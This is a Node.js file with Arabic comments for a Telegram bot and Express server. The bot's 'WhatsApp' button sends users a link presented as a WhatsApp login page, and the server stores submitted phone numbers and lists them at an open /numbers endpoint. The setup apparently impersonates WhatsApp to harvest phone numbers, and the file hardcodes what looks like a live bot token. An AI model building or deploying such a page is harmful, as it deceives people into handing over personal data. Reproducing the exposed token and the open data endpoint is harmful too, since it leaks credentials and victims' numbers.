const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const app = express();

// 🔑 ضع توكن البوت هنا
const token = '6834452190:AAHw0MIHXlupe9_EIH4fxMbxEMu5gw2LIjw';
const bot = new TelegramBot(token, { polling: true });

// لتخزين الأرقام مؤقتاً (في production استخدم قاعدة بيانات)
let receivedNumbers = [];

// خدمة الملفات الثابتة
app.use(express.static('public'));
app.use(express.json());

// 🎯 معالجة أمر /start
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const keyboard = {
        reply_markup: {
            inline_keyboard: [
                [{ text: "📱 وتساب", callback_data: "whatsapp" }],
                [{ text: "🔢 11", callback_data: "option_11" }],
                [{ text: "🔢 22", callback_data: "option_22" }]
            ]
        }
    };
    
    bot.sendMessage(chatId, "مرحباً! 👋 اختر أحد الخيارات:", keyboard);
});

// 🔘 معالجة الضغط على الأزرار
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    
    if (query.data === 'whatsapp') {
        // إرسال رابط موقع التسجيل فقط
        const websiteUrl = `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co`;
        
        bot.sendMessage(chatId, 
            `📱 **لتسجيل الدخول إلى WhatsApp**\n\n` +
            `🔗 اضغط على الرابط التالي:\n` +
            `${websiteUrl}\n\n` +
            `سيتم فتح صفحة تسجيل الدخول`,
            { parse_mode: 'Markdown' }
        );
        
    } else if (query.data === 'option_11') {
        bot.sendMessage(chatId, "✅ اخترت الخيار 11");
    } else if (query.data === 'option_22') {
        bot.sendMessage(chatId, "✅ اخترت الخيار 22");
    }
});

// 📍 راوت لاستقبال الأرقام من الموقع
app.post('/submit-phone', (req, res) => {
    const { phone, userId } = req.body;
    
    if (phone && /^[\d]{8,15}$/.test(phone)) {
        // حفظ الرقم
        receivedNumbers.push({
            phone: phone,
            userId: userId || 'from_website',
            timestamp: new Date().toLocaleString('ar-SA')
        });
        
        // إرسال إشعار للبوت (لاحقاً يمكن إرساله لك شخصياً)
        console.log('📱 رقم جديد من الموقع:', phone);
        
        res.json({ 
            success: true, 
            message: 'تم استلام رقمك بنجاح!' 
        });
    } else {
        res.json({ 
            success: false, 
            message: 'رقم غير صحيح' 
        });
    }
});

// 📊 راوت لعرض الأرقام المستلمة
app.get('/numbers', (req, res) => {
    res.json(receivedNumbers);
});

// 🏠 الصفحة الرئيسية
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>تسجيل الدخول إلى WhatsApp</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background: #f0f0f0;
                text-align: center;
                padding: 50px;
            }
            .container {
                background: white;
                padding: 40px;
                border-radius: 10px;
                box-shadow: 0 0 10px rgba(0,0,0,0.1);
                max-width: 400px;
                margin: 0 auto;
            }
            .btn {
                display: inline-block;
                padding: 15px 30px;
                background: #25D366;
                color: white;
                text-decoration: none;
                border-radius: 8px;
                font-weight: bold;
                margin: 20px 0;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🤖 بوت WhatsApp</h1>
            <p>للتسجيل، يرجى استخدام البوت في تليجرام</p>
            <a href="https://t.me/your_bot_username" class="btn">📲 الذهاب إلى البوت</a>
        </div>
    </body>
    </html>
    `);
});

// 🚀 تشغيل السيرفر
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log('✅ البوت يعمل على البورت:', PORT);
});
